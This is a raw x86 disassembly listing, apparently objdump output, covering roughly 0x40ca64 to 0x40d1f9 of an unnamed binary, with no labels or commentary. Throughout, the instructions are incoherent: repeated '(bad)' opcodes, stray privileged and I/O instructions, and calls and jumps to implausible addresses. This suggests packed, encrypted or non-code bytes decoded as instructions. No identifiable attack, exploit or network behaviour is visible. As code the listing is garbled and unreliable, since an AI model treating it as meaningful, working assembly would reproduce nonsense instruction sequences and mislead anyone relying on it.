  40ca64:	push   esi
  40ca65:	mov    edx,0x89360045
  40ca6a:	pushf  
  40ca6b:	cld    
  40ca6c:	mov    esi,0xf874853b
  40ca71:	mov    edx,edx
  40ca73:	or     bh,bh
  40ca75:	ret    0x4566
  40ca78:	or     bl,ch
  40ca7a:	or     BYTE PTR [ebx-0x7699f800],cl
  40ca80:	retf   0x4283
  40ca83:	add    al,BYTE PTR [eax]
  40ca85:	mov    bh,0x66
  40ca87:	adc    dl,cl
  40ca89:	iret   
  40ca8a:	mov    edx,0x66c400c7
  40ca8f:	dec    edx
  40ca91:	(bad)  
  40ca92:	push   edi
  40ca93:	mov    edx,0x66b70057
  40ca98:	mov    edx,0xffdf8df8
  40ca9d:	rcl    BYTE PTR [edi+0x66],0x51
  40caa1:	add    bh,BYTE PTR [ebx+0x5e4f45]
  40caa7:	ret    0x3b
  40caaa:	jne    0x40ca37
  40caac:	mov    DWORD PTR [ebx+0x457218fc],eax
  40cab2:	xor    esi,DWORD PTR ds:0xc7339c8b
  40cab8:	callw  0x5048
  40cabc:	cmp    al,0xf8
  40cabe:	fs inc ebp
  40cac0:	mov    ebx,0x83b35
  40cac5:	pop    es
  40cac6:	sub    ebx,DWORD PTR [esi-0x7675cd45]
  40cacc:	add    al,bh
  40cace:	xor    eax,DWORD PTR [ebp-0x45]
  40cad1:	cmp    eax,0xc7009c4e
  40cad6:	cmp    esi,esp
  40cad8:	jne    0x40ca5f
  40cada:	cmp    eax,0x338545fc
  40cae0:	clc    
  40cae1:	pushf  
  40cae2:	pop    ebx
  40cae3:	mov    eax,DWORD PTR ds:0xeb57c0ec
  40cae9:	push   ecx
  40caea:	xor    ecx,DWORD PTR [ebx-0x7b3c07a2]
  40caf0:	mov    ebx,DWORD PTR [esi-0x74bacdaf]
  40caf6:	psubsb mm1,QWORD PTR [eax]
  40caf9:	icebp  
  40cafa:	lea    ecx,[eax]
  40cafc:	clc    
  40cafd:	pop    es
  40cafe:	inc    ecx
  40cb00:	mov    esi,0x8a72
  40cb05:	push   ebp
  40cb06:	xor    ecx,DWORD PTR [edi]
  40cb08:	mov    edi,0xc24ed1
  40cb0d:	adc    DWORD PTR [ebp+0x0],0x66
  40cb11:	add    bh,al
  40cb13:	inc    ebp
  40cb14:	sub    ecx,DWORD PTR [ebx-0x3ed407bb]
  40cb1a:	mov    DWORD PTR [ebp+0x8],ecx
  40cb1d:	add    DWORD PTR [ebx],0x66514557
  40cb23:	or     DWORD PTR [edx],0xf32c29e
  40cb29:	cmp    edi,DWORD PTR [esi+esi*2]
  40cb2c:	mov    ecx,DWORD PTR [ebx+0x45f80881]
  40cb32:	dec    DWORD PTR [ebx+0x4db80c33]
  40cb38:	dec    esi
  40cb39:	mov    eax,DWORD PTR [eax]
  40cb3b:	mov    DWORD PTR [ebx],edi
  40cb3d:	mov    esi,DWORD PTR [ebp+0x4]
  40cb40:	xor    ecx,DWORD PTR [eax+0x5f]
  40cb43:	mov    ecx,DWORD PTR [ecx-0x3a87410]
  40cb49:	push   ecx
  40cb4a:	leave  
  40cb4b:	mov    eax,DWORD PTR [eax+edi*8]
  40cb4e:	push   ebp
  40cb4f:	test   ah,ch
  40cb51:	sahf   
  40cb52:	in     al,dx
  40cb53:	xor    al,bh
  40cb55:	mov    esp,ebp
  40cb57:	clc    
  40cb58:	test   DWORD PTR [ebp-0x74baff08],ebx
  40cb5e:	xor    al,0x10
  40cb60:	pushf  
  40cb61:	dec    ebp
  40cb62:	mov    ebp,DWORD PTR [ebx]
  40cb64:	in     al,dx
  40cb65:	mov    edx,DWORD PTR [edi-0xc]
  40cb68:	push   ecx
  40cb69:	icebp  
  40cb6a:	add    eax,0x77208
  40cb6f:	rol    DWORD PTR [ebp+0x72],0xc7
  40cb73:	add    al,dh
  40cb75:	rol    DWORD PTR [ebp+0x4545f827],0x3
  40cb7c:	xor    eax,edi
  40cb7e:	pushf  
  40cb7f:	dec    ebp
  40cb80:	mov    DWORD PTR [ebx],0x985f8fc
  40cb86:	clc    
  40cb87:	or     BYTE PTR [ebp+0x45],al
  40cb8a:	xor    eax,0x7080835
  40cb8f:	pop    es
  40cb90:	dec    ebp
  40cb91:	dec    ebp
  40cb92:	lea    ecx,[ebp+0x72720101]
  40cb98:	add    BYTE PTR [eax],al
  40cb9a:	dec    ebp
  40cb9b:	inc    ebp
  40cb9c:	sub    ebx,0x10518b57
  40cba2:	or     DWORD PTR [ebp-0x62],0x8b8b322b
  40cba9:	cld    
  40cbaa:	adc    cl,dh
  40cbac:	scas   eax,DWORD PTR es:[edi]
  40cbad:	or     BYTE PTR [ebx],bh
  40cbaf:	pop    es
  40cbb0:	xadd   ebp,ebp
  40cbb3:	jb     0x40cbb5
  40cbb5:	add    BYTE PTR [ebx+0x4d2910c1],cl
  40cbbb:	inc    ebp
  40cbbc:	sub    eax,DWORD PTR [ebx]
  40cbbe:	mov    edi,eax
  40cbc0:	lock dec ebp
  40cbc2:	icebp  
  40cbc3:	add    ecx,DWORD PTR [eax]
  40cbc5:	clc    
  40cbc6:	pop    es
  40cbc7:	mov    eax,ecx
  40cbc9:	data16 jb 0x40cbd4
  40cbcc:	add    BYTE PTR [ebp-0x3f],al
  40cbcf:	xor    eax,0x7450830
  40cbd4:	add    ecx,DWORD PTR [ebp-0x8]
  40cbd7:	lea    ecx,[ebp+0x1]
  40cbda:	add    esi,DWORD PTR [edx-0x8]
  40cbdd:	add    BYTE PTR [ecx],dl
  40cbdf:	inc    ebp
  40cbe0:	adc    bl,ch
  40cbe2:	dec    ecx
  40cbe3:	mov    ecx,DWORD PTR [ecx+0x45450408]
  40cbe9:	mov    esi,DWORD PTR ds:0x74d080c
  40cbef:	mov    cl,BYTE PTR [ebp-0x78]
  40cbf2:	lea    ecx,[ebx-0x768d07ff]
  40cbf8:	add    al,bh
  40cbfa:	inc    ebp
  40cbfb:	in     al,0xe9
  40cbfd:	inc    DWORD PTR [eax]
  40cbff:	leave  
  40cc00:	add    BYTE PTR [eax*2-0x71374ab],cl
  40cc07:	push   ecx
  40cc08:	rol    DWORD PTR [ebp+0x4d],0x35
  40cc0c:	sbb    DWORD PTR [edi+edx*2-0x7e07ae39],0x32f89e85
  40cc17:	sar    BYTE PTR [ebx],0x74
  40cc1a:	jbe    0x40cba7
  40cc1c:	mov    edi,esp
  40cc1e:	or     BYTE PTR [edi+0x45],dl
  40cc21:	push   ecx
  40cc22:	mov    eax,DWORD PTR ds:0x4d720c
  40cc28:	mov    eax,DWORD PTR [ebp-0x77]
  40cc2b:	jne    0x40cbb8
  40cc2d:	jmp    0x40cc23
  40cc2f:	mov    edx,DWORD PTR [edi-0x8]
  40cc32:	push   ecx
  40cc33:	push   edi
  40cc34:	mov    edx,DWORD PTR [ecx-0x8]
  40cc37:	add    eax,0x9e7284
  40cc3c:	xor    cl,BYTE PTR [ebp-0x77]
  40cc3f:	sub    edi,eax
  40cc41:	mov    DWORD PTR [ebx+0xc],ebx
  40cc44:	inc    ebp
  40cc45:	inc    ebp
  40cc46:	mov    esi,DWORD PTR ds:0x7c108f8
  40cc4c:	dec    ebp
  40cc4d:	sahf   
  40cc4e:	xor    DWORD PTR [edx],0x8518b57
  40cc54:	or     DWORD PTR [ebp-0x62],0x3beb3288
  40cc5b:	leave  
  40cc5c:	jbe    0x40cc66
  40cc5e:	mov    edx,DWORD PTR [ebp+0x8]
  40cc61:	in     al,dx
  40cc62:	inc    ebp
  40cc63:	in     al,dx
  40cc64:	mov    eax,DWORD PTR [edx]
  40cc66:	or     al,0x0
  40cc68:	dec    ebp
  40cc69:	inc    ebp
  40cc6a:	xor    ax,0x9c09
  40cc6e:	mov    edi,eax
  40cc70:	mov    esi,eax
  40cc72:	cld    
  40cc73:	test   DWORD PTR [edi-0x8],edx
  40cc76:	push   ecx
  40cc77:	inc    ebp
  40cc78:	mov    ecx,DWORD PTR [ebx-0x3f7bf708]
  40cc7e:	sahf   
  40cc7f:	pop    es
  40cc80:	xor    al,al
  40cc82:	mov    DWORD PTR [ebp-0x74e8ff08],esp
  40cc88:	inc    ebp
  40cc89:	or     al,0x3
  40cc8b:	sar    al,0xf2
  40cc8e:	dec    ebp
  40cc8f:	lea    eax,[ebx]
  40cc91:	in     al,0xf8
  40cc93:	dec    DWORD PTR [ecx]
  40cc95:	mov    DWORD PTR [eax],ecx
  40cc97:	cld    
  40cc98:	inc    ebp
  40cc99:	inc    ebp
  40cc9a:	inc    eax
  40cc9b:	mov    DWORD PTR [ebp-0x14],eax
  40cc9e:	jmp    0xff97cae8
  40cca3:	mov    edi,0x70008c2
  40cca8:	mov    eax,edi
  40ccaa:	push   ecx
  40ccab:	sahf   
  40ccac:	(bad)  
  40ccad:	xor    bh,ah
  40ccaf:	add    eax,DWORD PTR [ebp+0x4510f889]
  40ccb5:	inc    ebp
  40ccb6:	xor    al,0xe8
  40ccb8:	pushf  
  40ccb9:	std    
  40ccba:	xor    edi,edi
  40ccbc:	inc    eax
  40ccbd:	fadd   DWORD PTR [eax+0x45]
  40ccc0:	inc    ebp
  40ccc1:	mov    esi,DWORD PTR ds:0x7510814
  40ccc7:	inc    ebp
  40ccc8:	sahf   
  40ccc9:	xor    DWORD PTR [edx],0x8
  40cccc:	cmp    DWORD PTR [ebp+0xc],eax
  40cccf:	mov    eax,DWORD PTR [edx]
  40ccd1:	clc    
  40ccd2:	sub    al,0x40
  40ccd4:	inc    ebp
  40ccd5:	call   0xff49c80f
  40ccda:	pop    es
  40ccdb:	inc    ebp
  40ccdc:	sahf   
  40ccdd:	push   DWORD PTR [edx]
  40ccdf:	adc    BYTE PTR [ebx-0x3717f3ab],cl
  40cce5:	std    
  40cce6:	dec    ebp
  40cce7:	dec    DWORD PTR [ebx+0x5708fcdb]
  40cced:	inc    ebp
  40ccee:	push   ecx
  40ccef:	call   0xffb3c8f9
  40ccf4:	add    BYTE PTR [ebp+0x4d],al
  40ccf7:	xor    eax,DWORD PTR [ebx]
  40ccf9:	add    ecx,DWORD PTR [eax+edx*2]
  40ccfc:	add    DWORD PTR [ebp-0x45],esi
  40ccff:	inc    edx
  40cd01:	cld    
  40cd02:	add    BYTE PTR [ecx],dh
  40cd04:	mov    edi,edi
  40cd06:	or     DWORD PTR [ebx-0x30ff0be4],0xc1f4cec7
  40cd10:	test   DWORD PTR [esi],ebx
  40cd12:	clc    
  40cd13:	inc    ebp
  40cd14:	inc    ebp
  40cd15:	mov    esi,DWORD PTR [ecx+ecx*4]
  40cd18:	pushf  
  40cd19:	or     al,0x8b
  40cd1b:	inc    ebp
  40cd1c:	adc    BYTE PTR [ebx-0x3f7af3bb],cl
  40cd22:	jne    0x40cd5f
  40cd24:	xor    esi,DWORD PTR [ebp-0x17]
  40cd27:	xor    eax,DWORD PTR [eax]
  40cd29:	pop    edi
  40cd2a:	add    BYTE PTR [ebx+0x45],bl
  40cd2d:	ret    0x85
  40cd30:	je     0x40cd77
  40cd32:	push   ebx
  40cd33:	mov    eax,DWORD PTR [ebp-0xe02e8]
  40cd39:	mov    eax,DWORD PTR [ebp-0x75]
  40cd3c:	mov    ecx,DWORD PTR [esp+ecx*1]
  40cd3f:	in     al,dx
  40cd40:	inc    ebp
  40cd41:	or     DWORD PTR [ebx+0x5753f408],0x57
  40cd48:	push   edi
  40cd49:	test   BYTE PTR [ecx+0x0],dl
  40cd4c:	xor    eax,DWORD PTR [eax]
  40cd4e:	mov    esi,0x8472c0
  40cd53:	add    dh,al
  40cd55:	add    BYTE PTR [ebp-0x49],al
  40cd58:	mov    esp,DWORD PTR [eax]
  40cd5a:	or     al,0xc8
  40cd5c:	add    BYTE PTR [ebp-0x1],al
  40cd5f:	xor    ecx,DWORD PTR [ebx+0x8f88b21]
  40cd65:	inc    edx
  40cd66:	inc    eax
  40cd67:	add    bl,ch
  40cd69:	xor    ecx,DWORD PTR [ebx-0x17f7f37f]
  40cd6f:	add    BYTE PTR [ecx+0x45f4f889],cl
  40cd75:	mov    eax,DWORD PTR gs:[eax]
  40cd78:	sub    cl,cl
  40cd7a:	retf   0xff7e
  40cd7d:	mov    WORD PTR [ebp+0x10],cx
  40cd81:	jae    0x40cdf8
  40cd83:	lea    ecx,[ebx+0x63fffcf8]
  40cd89:	xor    edi,edi
  40cd8b:	jne    0x8bcc42de
  40cd91:	or     al,0xfc
  40cd93:	or     al,0x3e
  40cd95:	push   WORD PTR [ecx-0x75]
  40cd99:	jne    0x40cd8b
  40cd9b:	cmpxchg8b QWORD PTR [ecx]
  40cd9e:	(bad)  
  40cd9f:	mov    edx,0x66ec00ff
  40cda4:	jne    0x40cd75
  40cda6:	call   0xff9ec6b7
  40cdab:	cmovge edi,edx
  40cdae:	xor    edi,DWORD PTR [ebx+eax*1]
  40cdb1:	add    BYTE PTR [ebx],bh
  40cdb3:	sub    eax,0xf8b5d74
  40cdb8:	or     al,0xfa
  40cdba:	add    BYTE PTR [edi],cl
  40cdbc:	inc    ebp
  40cdbd:	cmp    al,0x8b
  40cdbf:	mov    ebx,0x4d3b08
  40cdc4:	sub    DWORD PTR [ebx],0x14
  40cdc7:	enterw 0x9ff8,0x3b
  40cdcc:	shl    BYTE PTR [esi+ebx*2+0x6a],0xc9
  40cdd1:	pop    edi
  40cdd2:	or     al,0x45
  40cdd4:	mov    esp,DWORD PTR [esi-0x8]
  40cdd7:	dec    ebp
  40cdd8:	inc    eax
  40cdd9:	data16 jmp 0x40ce29
  40cddc:	push   ebp
  40cddd:	jb     0x40cdcb
  40cddf:	jmp    0x40ce26
  40cde1:	inc    DWORD PTR [ebx+0x7d7f10f8]
  40cde7:	mov    eax,DWORD PTR [eax]
  40cde9:	or     BYTE PTR [esi-0x49],dl
  40cdec:	jo     0x7440ffa1
  40cdf2:	test   DWORD PTR [edx+0xf],eax
  40cdf5:	jmp    DWORD PTR [edi+0xf77000f]
  40cdfb:	inc    DWORD PTR [eax+0x33]
  40cdfe:	mov    ebx,DWORD PTR [edi-0x77]
  40ce01:	pop    ebx
  40ce02:	lock ret 0xd2
  40ce06:	push   ebp
  40ce07:	dec    ebp
  40ce08:	mov    eax,0xf88a81
  40ce0d:	dec    eax
  40ce0f:	ror    ax,0x3b
  40ce13:	rol    BYTE PTR [eax],0x3b
  40ce16:	dec    ebp
  40ce17:	lock adc DWORD PTR [esp+edi*8+0x6a5533eb],0xffffffec
  40ce20:	pop    edi
  40ce21:	in     al,dx
  40ce22:	cmp    edx,DWORD PTR [edi-0xc]
  40ce25:	clc    
  40ce26:	xchg   DWORD PTR fs:[edx-0xff3bff],esi
  40ce2d:	cmp    al,dh
  40ce2f:	jne    0x40cde8
  40ce31:	xor    edi,esp
  40ce33:	jmp    0xcdcf95
  40ce38:	mov    ebp,DWORD PTR [ecx+edi*1]
  40ce3b:	jne    0x40ce3f
  40ce3d:	call   0xfff8cb79
  40ce42:	mov    edi,0x14e97
  40ce47:	add    BYTE PTR [ebx],bh
  40ce49:	inc    edi
  40ce4a:	jne    0x40cdd5
  40ce4c:	mov    esi,DWORD PTR [eax+ecx*1-0x7f7648b9]
  40ce53:	mov    eax,0x8974471f
  40ce58:	mov    edi,DWORD PTR [eax+ecx*1+0x6600b787]
  40ce5f:	add    BYTE PTR [esi+0x88d1f45],bh
  40ce65:	stos   BYTE PTR es:[edi],al
  40ce66:	add    BYTE PTR [eax],al
  40ce68:	mov    bx,di
  40ce6b:	les    esi,FWORD PTR [ebx]
  40ce6d:	xchg   DWORD PTR [esi+0x0],esp
  40ce70:	iret   
  40ce71:	add    BYTE PTR [edx],dl
  40ce73:	inc    ebp
  40ce74:	jl     0x40ce03
  40ce76:	(bad)  
  40ce77:	out    dx,al
  40ce78:	cld    
  40ce79:	add    BYTE PTR [ebx+0x39ccf489],cl
  40ce7f:	xchg   esp,edi
  40ce81:	add    DWORD PTR [eax+eax*1-0x72babafa],ebp
  40ce88:	push   0x32
  40ce8a:	pop    edi
  40ce8b:	add    BYTE PTR [ebp-0x77],dh
  40ce8e:	paddq  mm1,mm2
  40ce91:	xchg   DWORD PTR [ecx+eax*1],edi
  40ce94:	add    BYTE PTR [eax],al
  40ce96:	adc    ecx,DWORD PTR [ecx+0x457cb083]
  40ce9c:	test   eax,ebp
  40ce9e:	inc    DWORD PTR [eax]
  40cea0:	inc    DWORD PTR [eax]
  40cea2:	ror    BYTE PTR [ebx+0xc9a85e],0x8
  40cea9:	dec    DWORD PTR [ebx-0x3e020718]
  40ceaf:	inc    esp
  40ceb1:	inc    ebp
  40ceb2:	inc    DWORD PTR [ebp-0x52ccf0cd]
  40ceb8:	data16 add BYTE PTR [ebp-0x75],cl
  40cebc:	(bad)  
  40cebe:	rcl    BYTE PTR [esi-0x1e],0x74
  40cec2:	mov    edi,DWORD PTR [eax-0x7d]
  40cec5:	lock push eax
  40cec7:	jle    0x40ce54
  40cec9:	mov    ecx,DWORD PTR [ebx+0x56a81c]
  40cecf:	mov    eax,DWORD PTR [ebx+0x7f80018]
  40ced5:	jge    0x40ce97
  40ced7:	mov    esi,DWORD PTR [eax]
  40ced9:	adc    al,0x0
  40cedb:	enter  0xd06a,0xff
  40cedf:	dec    ebp
  40cee0:	or     BYTE PTR [ecx+0x7dffe4c1],cl
  40cee6:	mov    edi,DWORD PTR [ebx]
  40cee8:	lods   al,BYTE PTR ds:[esi]
  40cee9:	ja     0x40ceeb
  40ceeb:	mov    DWORD PTR [ebp+0x45db22f8],ecx
  40cef1:	pop    ebp
  40cef2:	lea    edi,[ecx]
  40cef4:	inc    esp
  40cef5:	clc    
  40cef6:	inc    ebp
  40cef7:	outs   dx,BYTE PTR ds:[esi]
  40cef8:	lea    eax,[ebx]
  40cefa:	push   bp
  40cefc:	inc    ebp
  40cefd:	mov    ecx,DWORD PTR [ebp+0xb788e0]
  40cf03:	pop    edi
  40cf04:	mov    DWORD PTR [esi-0x40],ebx
  40cf07:	jae    0x40ce90
  40cf09:	cmp    eax,DWORD PTR [eax]
  40cf0b:	adc    al,0x0
  40cf0d:	pop    eax
  40cf0e:	inc    ebp
  40cf0f:	sbb    al,0x8d
  40cf11:	mov    ecx,esp
  40cf13:	or     BYTE PTR [eax],al
  40cf15:	cmp    al,0x89
  40cf17:	mov    eax,ecx
  40cf19:	cld    
  40cf1a:	xchg   DWORD PTR [ebp+0x0],edx
  40cf1d:	add    eax,DWORD PTR [eax]
  40cf1f:	add    eax,DWORD PTR [ebp+0x2b]
  40cf22:	lea    ecx,[eax]
  40cf24:	adc    BYTE PTR [ebp+0x0],al
  40cf27:	or     ecx,DWORD PTR [ecx-0x78763000]
  40cf2d:	fadd   QWORD PTR [ecx]
  40cf2f:	push   ebp
  40cf30:	add    BYTE PTR [ebx+0x1b8d0045],al
  40cf36:	push   esp
  40cf37:	inc    ebp
  40cf38:	add    bh,bh
  40cf3a:	push   edi
  40cf3b:	adc    BYTE PTR [ebp-0x18],bh
  40cf3e:	mov    ebp,edi
  40cf40:	fdivr  st,st(7)
  40cf42:	cli    
  40cf43:	dec    ebp
  40cf44:	add    BYTE PTR [ebp-0x74788bb0],al
  40cf4a:	add    esp,edi
  40cf4c:	add    BYTE PTR [eax],bh
  40cf4e:	xor    BYTE PTR [ebp-0x51],al
  40cf51:	cmp    edi,0xfffffffc
  40cf54:	mov    edi,edi
  40cf56:	lock in al,dx
  40cf58:	rcl    ah,0x84
  40cf5b:	pop    ebp
  40cf5c:	add    BYTE PTR [ebx+0x0],al
  40cf5f:	pop    ebp
  40cf60:	dec    eax
  40cf61:	cmp    edx,DWORD PTR [ebx-0x8]
  40cf64:	mov    edx,DWORD PTR [ecx+eax*1-0x7436fca5]
  40cf6b:	add    al,0x24
  40cf6d:	push   ebp
  40cf6e:	dec    esi
  40cf6f:	in     al,dx
  40cf70:	mov    eax,DWORD PTR [ebp+0x20]
  40cf73:	push   esi
  40cf74:	pop    esi
  40cf75:	mov    al,0x3
  40cf77:	add    DWORD PTR [ecx+0x7eb0e000],ecx
  40cf7d:	add    DWORD PTR [ebx],eax
  40cf7f:	add    BYTE PTR [ebx],al
  40cf81:	inc    ebp
  40cf82:	mov    eax,ebp
  40cf84:	hlt    
  40cf85:	(bad)  
  40cf86:	push   ebp
  40cf87:	dec    DWORD PTR [ecx-0x4fe07f2]
  40cf8d:	push   es
  40cf8e:	add    ecx,ecx
  40cf90:	pop    ebp
  40cf91:	or     BYTE PTR [ebx],dh
  40cf93:	jns    0x5e02b85a
  40cf99:	ret    0x76
  40cf9c:	jmp    0x40cf2d
  40cf9e:	mov    eax,DWORD PTR [ecx]
  40cfa0:	in     al,0x0
  40cfa2:	jge    0x40cf8f
  40cfa4:	sysexit 
  40cfa6:	cmp    al,0x8a
  40cfa8:	cmp    eax,DWORD PTR [eax]
  40cfaa:	sbb    BYTE PTR [eax],cl
  40cfac:	pop    ebp
  40cfad:	add    BYTE PTR [esi+0x66],bh
  40cfb0:	jae    0x40cfb3
  40cfb2:	mov    eax,ecx
  40cfb4:	call   0xb9b7:0x8b025583
  40cfbb:	mov    ebx,0x8d4e55
  40cfc0:	mov    al,0x3b
  40cfc2:	fdiv   DWORD PTR [ebp-0x8]
  40cfc5:	xor    edx,DWORD PTR [ebp+0x66]
  40cfc8:	mov    DWORD PTR [ecx],0x10087ec
  40cfce:	add    BYTE PTR [eax],al
  40cfd0:	push   ebp
  40cfd1:	ret    
  40cfd2:	mov    ecx,DWORD PTR [ebx-0x77c57404]
  40cfd8:	jne    0x40cfda
  40cfda:	mov    eax,ecx
  40cfdc:	fadd   QWORD PTR [esi]
  40cfde:	xor    al,0xc7
  40cfe0:	push   ebx
  40cfe1:	or     dh,dh
  40cfe3:	icebp  
  40cfe4:	inc    DWORD PTR [eax+0x8f4358b]
  40cfea:	rol    BYTE PTR [edx+0x5],0xa
  40cfee:	inc    ebp
  40cfef:	stc    
  40cff0:	mov    DWORD PTR [ebp-0x75],esi
  40cff3:	(bad)  
  40cff4:	lock add BYTE PTR [ebp-0x7a],al
  40cff8:	add    al,0x1
  40cffa:	dec    ebp
  40cffb:	add    BYTE PTR [ebp-0x39],dh
  40cffe:	mov    eax,ebx
  40d000:	call   0xe8c45990
  40d005:	sbb    al,0x5d
  40d007:	mov    edi,0xf85e8572
  40d00c:	pop    edi
  40d00d:	jge    0x40cfd1
  40d00f:	lea    eax,[eax]
  40d011:	dec    DWORD PTR [ebx+0x88b8b45]
  40d017:	or     bh,bh
  40d019:	leave  
  40d01a:	fadd   DWORD PTR [eax+eax*1-0x67ff7300]
  40d021:	dec    ebp
  40d022:	add    BYTE PTR [ebp-0xff7f075],al
  40d028:	xchg   ebp,eax
  40d029:	add    bh,bh
  40d02b:	mov    ecx,DWORD PTR [ebx-0x74b276f0]
  40d031:	mov    esi,DWORD PTR [ebx]
  40d033:	or     al,0x39
  40d035:	dec    ebp
  40d036:	pop    esi
  40d037:	mov    edx,DWORD PTR [ebp+0x5d458b08]
  40d03d:	in     al,0x4
  40d03f:	pushf  
  40d040:	mov    ecx,DWORD PTR [ecx-0x76ff1378]
  40d046:	push   ebx
  40d047:	call   0xc83595f
  40d04c:	add    BYTE PTR [ebp+0x5],cl
  40d04f:	(bad)  
  40d050:	cmp    edx,DWORD PTR [eax]
  40d052:	add    BYTE PTR [ebp+0x5783f889],al
  40d058:	add    dl,BYTE PTR [ecx-0x3e]
  40d05b:	mov    ebx,0xff028d0f
  40d060:	mov    edx,0x66330045
  40d065:	mov    eax,ebx
  40d067:	sub    esp,eax
  40d069:	add    eax,eax
  40d06b:	clc    
  40d06c:	mov    DWORD PTR [ebx-0x7477ff75],edx
  40d072:	add    BYTE PTR [ebx+ebx*2],cl
  40d075:	dec    ebp
  40d076:	push   edi
  40d077:	xor    edi,eax
  40d079:	xor    eax,DWORD PTR [esi+0x8018d]
  40d07f:	in     eax,0xe7
  40d081:	add    BYTE PTR [ebx],al
  40d083:	inc    ebp
  40d084:	jmp    0x40d0b9
  40d086:	xor    bh,0x49
  40d089:	mov    ebp,ecx
  40d08b:	adc    BYTE PTR [eax-0x75ccbfb3],cl
  40d091:	xor    eax,DWORD PTR [eax-0x10c483d5]
  40d097:	jne    0x40d099
  40d099:	mov    ecx,DWORD PTR [ebx+0x458808]
  40d09f:	mov    eax,DWORD PTR [ebx]
  40d0a1:	hlt    
  40d0a2:	pop    edi
  40d0a3:	add    BYTE PTR [ebp-0x37],dl
  40d0a6:	in     al,dx
  40d0a7:	push   es
  40d0a8:	in     al,dx
  40d0a9:	dec    ecx
  40d0aa:	push   edi
  40d0ab:	xor    eax,0x4d9c1735
  40d0b0:	mov    DWORD PTR [eax+0x624757e8],eax
  40d0b6:	mov    ecx,edx
  40d0b8:	in     al,0x4d
  40d0ba:	dec    ebp
  40d0bb:	add    BYTE PTR [ebp-0x43df0a9],0xe9
  40d0c2:	add    dl,dl
  40d0c4:	mov    ecx,DWORD PTR [ebx+0x4dc9080c]
  40d0ca:	test   BYTE PTR [eax+0x8008b00],cl
  40d0d0:	dec    ebp
  40d0d1:	push   ebp
  40d0d2:	mov    DWORD PTR [eax+0x4d72f4],edi
  40d0d8:	mov    eax,ecx
  40d0da:	clc    
  40d0db:	into   
  40d0dc:	dec    ebp
  40d0dd:	retf   0x18c7
  40d0e0:	lock dec ebp
  40d0e2:	test   DWORD PTR [ebx-0x31baf308],ecx
  40d0e8:	push   ebx
  40d0e9:	(bad)  
  40d0ea:	jge    0x40d0b6
  40d0ec:	push   esi
  40d0ed:	enter  0xce45,0x89
  40d0f1:	dec    ebp
  40d0f2:	cld    
  40d0f3:	jmp    0xff74d03d
  40d0f8:	pushf  
  40d0f9:	inc    ebp
  40d0fa:	mov    esi,0x78b0833
  40d0ff:	sub    esp,DWORD PTR [edx+0x3]
  40d102:	int    0x8
  40d104:	mov    ecx,DWORD PTR [ebp+0xc]
  40d107:	mov    eax,esi
  40d109:	adc    bl,cl
  40d10b:	(bad)  
  40d10c:	enter  0x4d85,0xff
  40d110:	jmp    0x85d214
  40d115:	xor    eax,DWORD PTR [ebp+0x5e]
  40d118:	mov    ebp,ebx
  40d11a:	or     al,0x8b
  40d11c:	(bad)  
  40d11d:	call   0x51cd28f0
  40d122:	cmp    al,0x5
  40d124:	fs jb  0x40d0b2
  40d127:	add    BYTE PTR [eax],cl
  40d129:	leave  
  40d12a:	ror    BYTE PTR [ecx+esi*8],cl
  40d12d:	push   ebp
  40d12e:	inc    ebp
  40d12f:	in     al,dx
  40d130:	mov    ebp,esp
  40d132:	or     al,0xc7
  40d134:	(bad)  
  40d135:	lock into 
  40d137:	test   ecx,eax
  40d139:	clc    
  40d13a:	rol    BYTE PTR [ebp+0x34],1
  40d13d:	xor    al,0x45
  40d13f:	pushf  
  40d140:	add    ecx,DWORD PTR [ebx-0x7b27604]
  40d146:	mov    al,BYTE PTR [ebp-0x7b]
  40d149:	cmp    eax,0x56349c75
  40d14e:	sub    al,0xc7
  40d150:	jmp    0x40d13e
  40d152:	mov    ebx,DWORD PTR [eax]
  40d154:	lock jmp 0xf02a:0x8bb27df1
  40d15c:	mov    edx,DWORD PTR [edi-0x14]
  40d15f:	push   ecx
  40d160:	icebp  
  40d161:	xor    eax,DWORD PTR [edx]
  40d163:	mov    edx,0x627280
  40d168:	enter  0x4dc8,0xfa
  40d16c:	add    ecx,edx
  40d16e:	cld    
  40d16f:	scas   eax,DWORD PTR es:[edi]
  40d170:	add    ebx,ebp
  40d172:	dec    ebp
  40d173:	mov    ecx,DWORD PTR [ebx-0x618a1708]
  40d179:	xor    esi,DWORD PTR [edx]
  40d17b:	xor    ebp,DWORD PTR [ebx]
  40d17d:	add    esi,DWORD PTR [ebx]
  40d17f:	add    edi,DWORD PTR [ebx]
  40d181:	test   DWORD PTR [ebp-0x75],esi
  40d184:	mov    edi,eax
  40d186:	adc    BYTE PTR [ebp+0x55],cl
  40d189:	je     0x40d1be
  40d18b:	xor    esi,DWORD PTR [ebx]
  40d18d:	xor    ebp,DWORD PTR [ebx]
  40d18f:	add    ebp,DWORD PTR [ebx]
  40d191:	add    esi,DWORD PTR [ebx]
  40d193:	ror    DWORD PTR [ecx+0x68ec108b],cl
  40d199:	enter  0xcaff,0x8b
  40d19d:	icebp  
  40d19e:	or     al,0xa
  40d1a0:	(bad)  
  40d1a1:	lock retf 
  40d1a3:	enter  0xf2c8,0x4d
  40d1a7:	retf   0xee89
  40d1aa:	or     BYTE PTR [ebp+0x45],dh
  40d1ad:	mov    edi,DWORD PTR [ebx]
  40d1af:	cld    
  40d1b0:	bswap  eax
  40d1b2:	pop    edi
  40d1b3:	mov    esp,0x328b9eff
  40d1b8:	in     al,0x8b
  40d1ba:	(bad)  
  40d1bb:	hlt    
  40d1bc:	pop    ebx
  40d1bd:	jne    0x40d1c7
  40d1bf:	xor    eax,DWORD PTR [ebp+0x33]
  40d1c2:	xor    eax,0x73b082b
  40d1c7:	jbe    0x40d167
  40d1c9:	mov    esi,DWORD PTR [edx]
  40d1cb:	clc    
  40d1cc:	pop    edi
  40d1cd:	mov    edx,eax
  40d1cf:	mov    eax,DWORD PTR [eax]
  40d1d1:	clc    
  40d1d2:	mov    ecx,ecx
  40d1d4:	adc    DWORD PTR [ebp+0x14],0xffffffec
  40d1d8:	inc    ebp
  40d1d9:	in     al,dx
  40d1da:	xor    eax,0xc7009c04
  40d1df:	inc    ebp
  40d1e0:	cld    
  40d1e1:	xor    eax,0xc7f89c85
  40d1e6:	add    esi,esp
  40d1e8:	inc    ebp
  40d1e9:	test   edi,eax
  40d1eb:	clc    
  40d1ec:	hlt    
  40d1ed:	inc    ebp
  40d1ee:	test   DWORD PTR ds:0x53579cf8,esi
  40d1f4:	inc    ebp
  40d1f5:	inc    ebp
  40d1f6:	aad    0x36
  40d1f8:	xlat   BYTE PTR ds:[ebx]
  40d1f9:	pushf  
